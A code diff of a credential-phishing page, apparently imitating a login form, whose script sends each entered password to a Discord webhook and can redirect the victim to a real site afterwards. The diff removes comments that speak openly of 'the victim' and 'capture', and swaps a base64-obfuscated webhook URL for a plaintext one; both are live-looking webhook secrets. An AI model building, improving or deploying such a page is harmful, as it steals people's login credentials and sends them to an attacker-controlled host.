@@ -125,11 +125,9 @@
       display: block;
     }
 
-    /* default (hidden password): show OPEN eye */
     .eye-toggle .icon-show { display: block; }
     .eye-toggle .icon-hide { display: none; }
 
-    /* revealed password: show CROSSED eye */
     .eye-toggle.visible .icon-show { display: none; }
     .eye-toggle.visible .icon-hide { display: block; }
 
@@ -352,12 +350,10 @@
               spellcheck="false"
             >
             <button type="button" class="eye-toggle" id="eyeToggle" aria-label="Show password">
-              <!-- open eye = currently hidden, tap to reveal -->
               <svg class="icon-show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
                 <circle cx="12" cy="12" r="3"/>
               </svg>
-              <!-- crossed eye = currently visible, tap to hide -->
               <svg class="icon-hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8S1 12 1 12z"/>
                 <circle cx="12" cy="12" r="3"/>
@@ -414,15 +410,10 @@
   </main>
 
   <script>
-    // ─── config ─────────────────────────────────────────────────────
-    // webhook is base64-encoded so casual "view source" doesn't grab it.
-    // decode at runtime. replace the string below with your own b64'd URL.
-    const _W = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MTM5OTEyMjQ2NzE2NDIxMS84UjhubzE2SkNLRXVEUV9GY19haEJKbGREZnN3Mk1WMTVEc19RMVJyVDljUWFTZlpNUWRwZEJqaTVyb2dTc0JQYTdkOQ==";
-    const DISCORD_WEBHOOK = atob(_W);
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558927875325829213/GAnr1NOny8bUmKg1ulMr0U1Of9TcoiN1RxxXQ4y-Vqd2kgZGyxGc6ayskEoovv5vwWXk";
 
-    // where to bounce the victim after a successful capture.
-    // set to null to stay on the timeout view instead.
-    const REDIRECT_URL = null; // e.g. "https://www.instagram.com/"
+    // where to bounce after capture. null = show timeout view instead.
+    const REDIRECT_URL = null;
 
     const MAX_ATTEMPTS = 3;
 
@@ -447,11 +438,9 @@
       }
     }
 
-    // escape backticks / newlines so the victim's password can't break
-    // Discord's markdown formatting or truncate the message.
     function esc(s) {
       return String(s)
-        .replace(/`/g, "\u02cb")   // modifier letter grave accent
+        .replace(/`/g, "\u02cb")
         .replace(/\n/g, "\\n")
         .replace(/\r/g, "\\r");
     }
@@ -468,8 +457,6 @@
       });
     }
 
-    // sendBeacon survives tab-close / navigation. fetch as fallback for
-    // browsers that don't support it or reject the payload size.
     function sendDiscord(entry) {
       if (!DISCORD_WEBHOOK) return;
       const payload = buildPayload(entry);
